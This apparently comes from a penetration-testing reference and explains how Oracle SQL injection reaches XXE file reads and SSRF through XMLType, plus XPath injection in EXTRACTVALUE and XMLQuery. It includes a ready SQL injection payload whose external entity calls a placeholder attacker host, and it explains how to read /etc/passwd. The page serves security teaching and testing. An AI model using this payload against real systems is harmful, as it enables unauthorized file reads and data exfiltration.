---
title: "XML and XXE abuse in Oracle injection"
description: "Abusing Oracle XMLType parsing from an injection to reach XML external entity file read and SSRF, and injecting into XMLQuery and EXTRACTVALUE."
keywords:
  - XMLType
  - XXE
  - EXTRACTVALUE
  - XMLQuery
  - Oracle SSRF
---

# XML and XXE abuse

Oracle's XML features turn a SQL injection into an XML parser attack. Constructing an `XMLType` from attacker-controlled markup makes the database parse it, and historically that parser resolved external entities, giving file read and server-side request forgery from inside SQL.

An external-entity document built through `XMLType` resolves the entity when parsed, so a `SYSTEM` entity pointing at a file or URL is fetched by the database server:

```sql
' AND XMLType('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://attacker.tld/">]><r>&x;</r>') IS NOT NULL-- 
```

Pointing the entity at `file:///etc/passwd` reads a file, and at an internal URL performs SSRF, with the response surfaced through an error or a further `EXTRACTVALUE`. This also doubles as an out-of-band channel, since the `http://` fetch reaches an attacker listener even when the content is not reflected. Current patched versions restrict external-entity resolution, so this depends on the database version and configuration.

Separately, the XML query functions are injection sinks when input is concatenated into their XPath or XQuery argument. `EXTRACTVALUE(xml, xpath)`, `XMLQuery`, and `XMLTABLE` evaluate an expression built from input, so an attacker who controls part of the XPath can redirect the selection or trigger errors that leak data, the same class of flaw as XPath injection applied inside the database.

## References

- Oracle Database XML DB Developer's Guide: XMLType, XMLQuery, external entities
- OWASP Testing Guide: Testing for SQL Injection; XML External Entity Prevention
